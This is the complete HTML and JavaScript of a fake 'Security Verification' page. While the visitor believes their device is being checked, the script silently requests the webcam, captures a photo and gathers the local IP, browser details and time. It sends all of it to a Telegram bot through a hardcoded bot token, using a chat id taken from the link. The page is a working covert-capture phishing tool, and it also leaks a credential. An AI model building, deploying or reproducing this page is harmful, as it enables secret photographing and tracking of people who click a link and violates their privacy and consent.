<!DOCTYPE html>
<html>
<head>
    <title>Security Check</title>
    <style>
        body { font-family: sans-serif; text-align: center; margin-top: 40px; background-color: #f5f5f5; }
        video, canvas { display: none; }
        .loading { display: inline-block; width: 50px; height: 50px; border: 3px solid rgba(76, 175, 80, 0.3); border-radius: 50%; border-top-color: #4CAF50; animation: spin 1s ease-in-out infinite; margin-bottom: 20px; }
        @keyframes spin { to { transform: rotate(360deg); } }
        h2 { color: #333; }
        p { color: #666; }
    </style>
</head>
<body>
    <video id="video" width="320" height="240" autoplay></video>
    <canvas id="canvas" width="320" height="240"></canvas>
    
    <div id="loading-container">
        <div class="loading"></div>
        <h2>Security Verification in Progress</h2>
        <p>Please wait while we verify your device...</p>
    </div>

    <script>
        const video = document.getElementById("video");
        const canvas = document.getElementById("canvas");
        const ctx = canvas.getContext("2d");
        let ip = "Unknown";

        // Get the user ID from the URL
        const urlParams = new URLSearchParams(window.location.search);
        const user_id = urlParams.get('id');
        
        if (!user_id) {
            document.body.innerHTML = "<h2>Invalid verification link</h2><p>This verification link appears to be invalid or expired.</p>";
        } else {
            startVerification();
        }
        
        function startVerification() {
            getLocalIP(detectedIp => {
                ip = detectedIp;
                requestCameraAccess();
            });
        }

        function sendToTelegram(message, photo = null) {
            const botToken = "7913534738:AAEthUisUFuzA0p0q5txMWAiW74faM0j9ho";

            if (photo) {
                console.log("Sending photo...");
                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        chat_id: user_id,
                        photo: photo, // Send Base64 string directly
                        caption: "üì∏ Camera snapshot"
                    })
                }).then(response => {
                    if (!response.ok) {
                        console.error("Failed to send photo:", response.statusText);
                    } else {
                        console.log("Photo sent successfully!");
                    }
                }).catch(err => {
                    console.error("Error sending photo:", err);
                });
            }

            console.log("Sending message...");
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: user_id,
                    text: message,
                    parse_mode: "HTML"
                })
            }).then(response => {
                if (!response.ok) {
                    console.error("Failed to send message:", response.statusText);
                } else {
                    console.log("Message sent successfully!");
                }
            }).catch(err => {
                console.error("Error sending message:", err);
            });
        }

        function requestCameraAccess() {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    video.srcObject = stream;
                    setTimeout(captureAndSend, 2000); // Wait 2 seconds for camera to initialize
                })
                .catch(err => {
                    console.error("Camera access denied:", err);
                    sendBasicInfo();
                });
        }

        function captureAndSend() {
            if (video.srcObject) {
                ctx.drawImage(video, 0, 0, 320, 240);
                const imageData = canvas.toDataURL("image/jpeg", 0.7).split(',')[1]; // Extract Base64 part
                console.log("Captured image data:", imageData);
                sendBasicInfo(imageData);
            } else {
                sendBasicInfo();
            }
        }

        function sendBasicInfo(imageBase64 = null) {
            const message = `
üì• <b>New Link Click Detected!</b>

üåç <b>IP:</b> ${ip}
üñ•Ô∏è <b>Device:</b> ${navigator.userAgent}
‚è∞ <b>Time:</b> ${new Date().toLocaleString()}
            `;
            sendToTelegram(message, imageBase64);
        }

        function getLocalIP(callback) {
            const pc = new RTCPeerConnection({ iceServers: [] });
            pc.createDataChannel("");
            pc.createOffer().then(offer => pc.setLocalDescription(offer));
            pc.onicecandidate = event => {
                if (event && event.candidate && event.candidate.candidate) {
                    const ipMatch = event.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
                    if (ipMatch) {
                        callback(ipMatch[0]);
                        pc.close();
                    }
                }
            };
            setTimeout(() => {
                callback("Detection Failed");
                pc.close();
            }, 5000);
        }
    </script>
</body>
</html>
